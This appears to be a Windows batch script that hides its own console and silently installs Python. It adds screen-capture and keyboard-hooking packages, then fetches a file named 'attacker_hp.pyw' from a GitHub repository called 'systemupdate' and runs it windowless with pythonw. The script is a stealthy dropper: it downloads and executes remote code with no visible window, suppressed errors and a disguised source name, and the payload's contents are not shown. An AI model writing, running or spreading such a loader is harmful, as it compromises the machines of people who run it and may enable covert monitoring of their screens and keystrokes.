@echo off
:: 더블클릭 시 CMD 창 숨기고 백그라운드로 실행 (끝나면 자동 종료)
if /I "%~1"=="_silent" goto :main
powershell -NoProfile -WindowStyle Hidden -Command "Start-Process -FilePath 'cmd.exe' -ArgumentList '/d /c \"\"%~f0\"\" _silent' -WindowStyle Hidden"
exit /b 0

:main
pushd "%~dp0"
set "PATH=%SystemRoot%\system32;%SystemRoot%;%SystemRoot%\System32\Wbem;%PATH%"

:: === Step 1: Python install ===
if exist "C:\Program Files\Python311\python.exe" goto :step2
if exist "%LocalAppData%\Programs\Python\Python311\python.exe" goto :step2

bitsadmin /transfer "pyinst" /download /priority high "https://www.python.org/ftp/python/3.11.8/python-3.11.8-amd64.exe" "%TEMP%\pyinst.exe"
if %errorlevel% neq 0 exit /b 1

start /wait "" "%TEMP%\pyinst.exe" /quiet InstallAllUsers=1 PrependPath=1
del "%TEMP%\pyinst.exe" >nul 2>&1

set "PATH=C:\Program Files\Python311\Scripts;C:\Program Files\Python311;%LocalAppData%\Programs\Python\Python311\Scripts;%LocalAppData%\Programs\Python\Python311;%PATH%"

if exist "C:\Program Files\Python311\python.exe" goto :step2
if exist "%LocalAppData%\Programs\Python\Python311\python.exe" goto :step2
exit /b 1

:: === Step 2: Packages ===
:step2
python -m pip install --upgrade pip --quiet 2>nul
python -m pip install numpy pillow mss keyboard pywin32 opencv-python dxcam --quiet 2>nul
if %errorlevel% neq 0 (
    python -m pip install numpy pillow mss keyboard pywin32 opencv-python dxcam >nul 2>&1
    if %errorlevel% neq 0 exit /b 1
)

:: === Step 3: Download attacker (API direct, no CDN) ===
python -c "import urllib.request,base64,json;d=json.loads(urllib.request.urlopen('https://api.github.com/repos/blacknut0319-del/systemupdate/contents/attacker_hp.pyw').read());open(r'%~dp0attacker_hp.pyw','wb').write(base64.b64decode(d['content']))"
if %errorlevel% neq 0 exit /b 1

:: === Step 4: Run (pythonw = 콘솔 없음) ===
if exist "C:\Program Files\Python311\pythonw.exe" (
    start "" "C:\Program Files\Python311\pythonw.exe" "%~dp0attacker_hp.pyw"
) else (
    start "" "%LocalAppData%\Programs\Python\Python311\pythonw.exe" "%~dp0attacker_hp.pyw"
)
exit /b 0
